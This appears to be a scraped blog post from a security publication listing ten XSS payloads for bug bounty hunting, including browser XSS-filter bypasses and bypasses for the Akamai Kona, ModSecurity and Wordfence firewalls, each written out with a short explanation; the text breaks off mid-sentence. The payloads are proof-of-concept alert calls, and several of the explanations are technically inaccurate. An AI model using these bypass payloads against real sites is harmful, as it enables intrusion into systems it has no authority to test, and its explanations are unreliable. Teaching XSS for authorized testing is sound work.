---
title: 10 Common XSS Payloads and How to Use Them for Bug Bounty Hunting
url: https://infosecwriteups.com/10-common-xss-payloads-and-how-to-use-them-for-bug-bounty-hunting-9c49cb54297a?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2023-04-22
fetch_date: 2025-10-04T11:33:14.501470
---

# 10 Common XSS Payloads and How to Use Them for Bug Bounty Hunting

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F9c49cb54297a&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2F10-common-xss-payloads-and-how-to-use-them-for-bug-bounty-hunting-9c49cb54297a&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2F10-common-xss-payloads-and-how-to-use-them-for-bug-bounty-hunting-9c49cb54297a&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-9c49cb54297a---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-9c49cb54297a---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# 10 Common XSS Payloads and How to Use Them for Bug Bounty Hunting

[![Security Lit Limited](https://miro.medium.com/v2/resize:fill:64:64/1*yrQrISi6PlPkHrHAS2ai3g.png)](https://securitylit.medium.com/?source=post_page---byline--9c49cb54297a---------------------------------------)

[Security Lit Limited](https://securitylit.medium.com/?source=post_page---byline--9c49cb54297a---------------------------------------)

4 min read

·

Apr 10, 2023

--

1

Listen

Share

Press enter or click to view image in full size

![]()

Photo by [Caspar Camille Rubin](https://unsplash.com/%40casparrubin?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText) on [Unsplash](https://unsplash.com/s/photos/hacking?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText)

As technology advances, the techniques of exploiting vulnerabilities in web applications also become more sophisticated. One such vulnerability is cross-site scripting (XSS), which can be used to inject malicious code into a website or web application, allowing an attacker to steal sensitive data, manipulate user sessions, or even take full control of the web server. In this blog post, we will analyze several XSS payloads and explain how they work.

### Chrome XSS-Auditor Bypass by @vivekchsm

The Chrome XSS-Auditor is a built-in security feature that prevents reflected XSS attacks in Google Chrome. However, it is not foolproof and can be bypassed using certain techniques. One such technique is the SVG XSS payload created by @vivekchsm.

**Payload:**

```
<svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>This payload injects a malicious script into an SVG element. The script sets the href attribute of the animate element to javascript:alert(1), which will execute the alert function when clicked. Since the script is injected into an SVG element, the Chrome XSS-Auditor fails to detect it.
```

### Chrome < v60 beta XSS-Auditor Bypass

Before version 60 of Chrome, the XSS-Auditor could be bypassed using a data URL with a newline character.

**Payload**:

```
<script src="data:,alert(1)%250A-->
```

This payload uses a data URL to load a script that executes the alert function. The `%250A` character is a URL-encoded newline character, which bypasses the Chrome XSS-Auditor.

### Other Chrome XSS-Auditor Bypasses

Other ways to bypass the Chrome XSS-Auditor include using null bytes and using script tags with alternate character sets.

**Payload**:

```
<script>alert(1)</script
<script>alert(1)%0d%0a-->%09</script
<x>%00%00%00%00%00%00%00<script>alert(1)</script>
```

These payloads inject a script tag that executes the alert function. The null bytes in the third payload are used to bypass the Chrome XSS-Auditor, while the second payload uses a combination of carriage return, line feed, and tab characters to obfuscate the script.

### Safari XSS Vector by @mramydnei

This XSS payload is specific to the Safari web browser.

**Payload:**

```
<script>location.href;'javascript:alert%281%29'</script>
```

This payload injects a script that sets the location.href property to `'javascript:alert(1)'`. When executed, the script will navigate to a new page with the `javascript:alert(1)` URL, which will execute the alert function.

### XSS Polyglot by Ahmed Elsobky

An XSS polyglot is a payload that can be interpreted as valid code in multiple programming languages.

**Payload**:

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

This payload is an XSS polyglot that can be interpreted as valid JavaScript, HTML, and CSS code. It injects a script that sets the onClick attribute of an HTML element to `alert()`. The CSS code is used to hide the injected script from view.

### Kona WAF (Akamai) Bypass

This payload is designed to bypass the Kona WAF (Web Application Firewall) implemented by Akamai. It takes advantage of the lack of proper sanitization of user input in the WAF. The payload itself consists of a combination of characters that will not trigger any blocking by the WAF. The **payload consists of:**

```
\');confirm(1);//
```

This payload is meant to be used in an input field vulnerable to XSS. When executed, it will close the current script tag, add a confirm dialog box to prompt the user, and then add a comment to close the script tag. The backslash before the single quote is used to escape the quote so that it does not prematurely end the script tag.

### ModSecurity WAF Bypass

This payload is designed to bypass the ModSecurity WAF. It is a bit more complex than some of the other payloads, as it takes advantage of a feature of ModSecurity where certain input data can be split into separate variables. The payload itself consists of:

```
<img src=x onerror=prompt(document.domain) onerror=prompt(document.domain) onerror=prompt(document.domain)>
```

This payload takes advantage of the fact that ModSecurity will split certain input data into separate variables. In this case, the ‘onerror’ attribute of the img tag is split into three separate variables, each of which executes the same prompt dialog box to display the current document domain. Because the WAF only looks at individual variables, it is able to bypass the filtering and execute the payload.

**Wordfence XSS Bypasses**

Wordfence is a security plugin for WordPress sites that includes a firewall to protect against XSS attacks. However, it is not perfect and can be bypassed using the following payloads:

```
<meter onmouseover="alert(1)"
```

This payload is designed to bypass the Wordfence firewall by taking advantage of the fact that it does not filter certain HTML tags. In this case, the meter tag is used, along with an onmouseover event that triggers an alert dialog box.

```
'">><div><meter onmouseover="alert(1)"</div>"
```

Thi...